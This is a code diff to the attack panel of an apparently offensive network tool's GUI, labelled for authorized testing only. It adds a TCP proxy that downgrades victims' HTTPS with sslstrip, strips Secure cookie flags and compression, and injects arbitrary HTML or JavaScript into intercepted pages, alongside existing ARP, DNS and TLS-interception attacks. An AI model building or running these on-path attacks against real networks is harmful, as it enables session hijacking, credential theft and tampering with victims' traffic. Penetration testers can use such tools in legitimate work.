@@ -7,6 +7,7 @@ For authorized testing only.
 from __future__ import annotations
 
 from PySide6.QtWidgets import (
+    QCheckBox,
     QComboBox,
     QFileDialog,
     QGroupBox,
@@ -35,6 +36,7 @@ class AttacksPanel(QWidget):
         self._name = None
         self._tls = None
         self._ca = None
+        self._tcp = None
 
         root = QVBoxLayout(self)
         note = QLabel("Active on-path attacks — authorized engagements only. Needs root.")
@@ -44,6 +46,7 @@ class AttacksPanel(QWidget):
         root.addWidget(self._dns_box())
         root.addWidget(self._name_box())
         root.addWidget(self._tls_box())
+        root.addWidget(self._tcpproxy_box())
         root.addStretch(1)
 
     # ---- ARP ----------------------------------------------------------------
@@ -223,5 +226,68 @@ class AttacksPanel(QWidget):
         self._ensure_ca().write_ca(path)
         self.tls_status.setText(f"CA written to {path} — install it on the victim as trusted root")
 
+    # ---- TCP proxy (HTTP rewrite, large bodies) -----------------------------
+    def _tcpproxy_box(self) -> QGroupBox:
+        box = QGroupBox("TCP proxy — HTTP rewrite across full/large bodies (R2)")
+        v = QVBoxLayout(box)
+        row = QHBoxLayout()
+        self.tp_port = QSpinBox(); self.tp_port.setRange(1, 65535); self.tp_port.setValue(8080)
+        self.tp_target = QLineEdit(); self.tp_target.setPlaceholderText("upstream host:port (blank = SO_ORIGINAL_DST)")
+        b_start = QPushButton("Start"); b_start.clicked.connect(self._tcp_start)
+        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._tcp_stop)
+        for w in (QLabel("Listen:"), self.tp_port, QLabel("Upstream:"), self.tp_target, b_start, b_stop):
+            row.addWidget(w)
+        v.addLayout(row)
+        row2 = QHBoxLayout()
+        self.tp_sslstrip = QCheckBox("sslstrip")
+        self.tp_stripenc = QCheckBox("strip-encoding"); self.tp_stripenc.setChecked(True)
+        self.tp_cookie = QCheckBox("strip-cookie")
+        self.tp_inject = QLineEdit(); self.tp_inject.setPlaceholderText("inject HTML/JS before </body> (optional)")
+        for w in (self.tp_sslstrip, self.tp_stripenc, self.tp_cookie, QLabel("Inject:"), self.tp_inject):
+            row2.addWidget(w)
+        v.addLayout(row2)
+        self.tp_status = QLabel("idle — redirect victim HTTP → listen port")
+        v.addWidget(self.tp_status)
+        return box
+
+    def _tcp_start(self):
+        from reforge.attacks import tcp_proxy
+
+        self._tcp_stop()
+        target = self.tp_target.text().strip()
+        if target:
+            host, _, port = target.partition(":")
+            resolver = (lambda c, h=host, p=int(port or 80): (h, p))
+        else:
+            resolver = (lambda c: tcp_proxy.so_original_dst(c) or ("127.0.0.1", 80))
+
+        transforms = []
+        if self.tp_sslstrip.isChecked():
+            transforms.append(tcp_proxy.sslstrip())
+        if self.tp_stripenc.isChecked():
+            transforms.append(tcp_proxy.strip_accept_encoding())
+        if self.tp_cookie.isChecked():
+            transforms.append(tcp_proxy.strip_secure_cookie())
+        if self.tp_inject.text().strip():
+            transforms.append(tcp_proxy.inject(self.tp_inject.text().encode()))
+
+        self._tcp = tcp_proxy.TcpProxy(resolver, http_transforms=transforms,
+                                       listen=("0.0.0.0", self.tp_port.value()))
+        try:
+            port = self._tcp.start()
+            self.tp_status.setText(f"proxying on :{port} ({len(transforms)} transform(s))")
+        except Exception as exc:
+            self.tp_status.setText(f"error: {exc}")
+
+    def _tcp_stop(self):
+        if self._tcp:
+            try:
+                self._tcp.stop()
+            except Exception:
+                pass
+            self._tcp = None
+            self.tp_status.setText("stopped")
+
     def stop_all(self):
-        self._arp_stop(); self._dns_stop(); self._name_stop(); self._tls_stop()
+        self._arp_stop(); self._dns_stop(); self._name_stop()
+        self._tls_stop(); self._tcp_stop()
